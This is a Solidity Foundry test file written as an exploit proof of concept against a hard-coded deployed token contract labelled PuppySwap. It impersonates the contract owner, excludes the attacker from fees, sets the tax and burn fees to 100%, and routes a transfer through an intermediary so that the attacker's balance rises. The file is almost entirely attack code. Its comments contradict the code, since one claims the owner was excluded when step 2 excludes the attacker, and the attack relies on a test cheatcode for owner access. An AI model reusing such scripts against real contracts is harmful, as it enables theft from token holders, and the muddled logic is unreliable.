pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPuppySwap_Token {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function excludeAccount(address account) external;
    function _setTaxFee(uint256 taxFee) external;
    function _setBurnFee(uint256 burnFee) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xc845341377C68b8003485036c3163b8DBcf8acb2;
    address attacker = address(this);
    IPuppySwap_Token token;
    uint256 initialBalance;
    address owner;
    address intermediary;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IPuppySwap_Token(TARGET);
        vm.label(TARGET, "PuppySwap Token");
        vm.label(attacker, "Attacker");

        // Get the owner address by calling owner() on the contract
        owner = token.owner();
        vm.label(owner, "Contract Owner");

        // Create intermediary address for transfers
        intermediary = address(0x1337);
        vm.label(intermediary, "Intermediary");

        // Record initial attacker balance
        initialBalance = token.balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 startBalance = IERC20(TARGET).balanceOf(address(this));
        // Step 1: Impersonate the owner
        vm.startPrank(owner);

        // Step 2: Exclude attacker from fees (attacker won't pay fees but will receive reflections)
        token.excludeAccount(attacker);

        // Step 3: Set tax fee to 100%
        token._setTaxFee(100);

        // Step 4: Set burn fee to 100%
        token._setBurnFee(100);

        // Step 5: Transfer tokens from owner to intermediary (owner is excluded after step 2, but we need tokens in circulation)
        uint256 transferAmount = 1000000 * 1e9; // 1M tokens
        token.transfer(intermediary, transferAmount);

        // Step 6: Stop owner prank
        vm.stopPrank();

        // Step 7: Transfer from intermediary to trigger fee collection (100% fees reflected to attacker)
        vm.prank(intermediary);
        token.transfer(address(0xdead), transferAmount);

        // Step 8: Verify attacker balance increased
        uint256 balanceAfter = token.balanceOf(attacker);
        assertGt(balanceAfter, startBalance, "Attacker balance should increase from fee reflections");
        uint256 endBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(endBalance, startBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

